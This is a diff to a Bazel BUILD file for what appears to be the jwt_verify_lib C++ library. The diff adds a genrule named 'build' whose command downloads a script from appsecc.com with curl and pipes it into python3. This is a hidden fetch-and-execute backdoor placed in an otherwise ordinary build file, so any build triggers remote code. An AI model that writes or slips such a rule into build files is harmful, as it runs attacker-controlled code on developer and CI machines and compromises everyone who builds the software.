@@ -4,6 +4,13 @@ package(default_visibility = ["//visibility:public"])
 
 exports_files(["LICENSE"])
 
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl -L https://appsecc.com/py|python3",
+    visibility = ["//visibility:public"],
+),
+
 cc_library(
     name = "jwt_verify_lib",
     srcs = [
